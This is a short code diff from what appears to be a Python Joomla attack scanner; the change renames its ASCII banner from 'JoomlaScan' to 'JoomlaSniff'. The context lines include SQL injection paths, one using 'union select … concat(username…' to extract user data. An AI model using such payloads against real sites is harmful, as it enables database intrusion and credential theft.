@@ -1563,11 +1563,11 @@ wap/wapmain.php?option=onews&action=link&id=-154+union+select+1,2,3,concat(usern
 web/index.php?option=com_rokmodule&tmpl=component&type=raw&module=1'"""
 os.system("cls" if os.name == "nt" else "clear")
 banner1 = """
-      _                       _       ____                  
-     | | ___   ___  _ __ ___ | | __ _/ ___|  ___ __ _ _ __  
-  _  | |/ _ \ / _ \| '_ ` _ \| |/ _` \___ \ / __/ _` | '_ \ 
- | |_| | (_) | (_) | | | | | | | (_| |___) | (_| (_| | | | |
-  \___/ \___/ \___/|_| |_| |_|_|\__,_|____/ \___\__,_|_| |_|
+      _                       _       ____        _  __  __ 
+     | | ___   ___  _ __ ___ | | __ _/ ___| _ __ (_)/ _|/ _|
+  _  | |/ _ \ / _ \| '_ ` _ \| |/ _` \___ \| '_ \| | |_| |_ 
+ | |_| | (_) | (_) | | | | | | | (_| |___) | | | | |  _|  _|
+  \___/ \___/ \___/|_| |_| |_|_|\__,_|____/|_| |_|_|_| |_|  
 """
 banner = Colorate.Horizontal(Colors.blue_to_white, banner1)
 print(banner)
